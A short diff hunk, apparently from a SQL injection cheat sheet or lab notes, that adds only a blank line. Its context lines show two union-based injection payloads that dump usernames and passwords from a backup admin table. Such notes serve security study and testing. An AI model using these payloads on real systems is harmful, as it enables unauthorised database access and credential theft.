@@ -183,6 +183,7 @@ List columns in table named `credentials`
 ```sql
 cn' UNION select 1, username, password, 4,5 from backup.admin_bk-- 
 ```
+
 ```sql
 cn' UNION select group_concat(value1,0x2b,value2) from backup.admin_bk-- 
 ```
